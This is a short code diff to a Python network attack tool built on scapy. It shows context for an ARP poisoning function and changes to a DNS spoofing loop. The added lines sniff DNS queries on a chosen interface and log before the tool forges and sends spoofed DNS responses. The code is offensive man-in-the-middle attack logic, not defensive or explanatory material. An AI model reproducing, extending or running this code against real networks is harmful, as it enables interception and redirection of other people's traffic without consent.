@@ -157,6 +157,8 @@ def arp_poison_stealthy(victim_ip, victim_mac, router_ip, attacker_mac):
 # Give the interface of the network, the IP address to spoof a certain IP, if spoof_all is false.
 def dns_spoofing(interface, ip, spoof_all=True):
     while 1:
+        dns_packet = scapy.all.sniff(iface=interface, filter="dst port 53", count=1)
+        logger.info("Packet found. Spoofing DNS packet")
         try:
             msg = q.get(False)
             if msg == 'dns_stop':
@@ -195,6 +197,6 @@ def dns_spoofing(interface, ip, spoof_all=True):
                                                an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=dns_packet[0].getlayer(
                                                    scapy.all.IP).src))
                 scapy.all.send(spoofed_packet)
-
+            logger.info("Sending altered packet")
     sys.exit(1)
 
